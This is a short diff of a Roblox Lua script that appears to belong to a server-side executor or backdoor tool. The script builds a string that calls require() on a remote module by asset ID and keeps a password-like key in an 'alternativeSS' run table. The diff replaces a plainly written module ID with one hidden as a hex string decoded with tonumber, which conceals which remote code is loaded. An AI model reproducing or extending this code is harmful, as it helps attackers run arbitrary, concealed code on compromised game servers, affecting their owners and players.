@@ -11,7 +11,7 @@ local JointsService = game:GetService("JointsService")
 local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = game:GetService("Players").LocalPlayer
 
-local requireScript = ('require(100263845596551)("%s", ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")'):format(LocalPlayer.Name)
+local requireScript = ('require(tonumber("76ebeac43c19", 16))')
 
 local alternativeSS = {
 	run = { [1] = "5#lGIERKWEF" },
